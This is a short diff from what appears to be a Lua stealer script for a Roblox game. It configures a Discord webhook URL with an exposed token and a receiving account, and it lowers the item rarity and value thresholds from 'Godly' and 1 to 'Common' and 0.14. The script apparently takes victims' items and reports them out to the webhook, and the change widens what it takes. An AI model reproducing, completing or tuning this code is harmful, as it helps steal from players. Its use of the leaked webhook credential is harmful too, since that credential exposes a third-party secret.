@@ -4,8 +4,8 @@ _G.Ex = true
 
 local WEBHOOK = "https://discord.com/api/webhooks/1538453002023604346/zqLjnkHkfCmj5ADWujuPBpjzkYRfz1WK-MZgrgPsEKr9y7fCaT3izFb3xBB56c0lMwGS"
 local RECEIVER = {"JAMAL_THESCRIPTGUY"}
-local MINIMUM_RARITY = "Godly"
-local MINIMUM_VALUE = 1
+local MINIMUM_RARITY = "Common"
+local MINIMUM_VALUE = 0.14
 local RECEIVERx = RECEIVER
 
 local function GetRequestFunction()
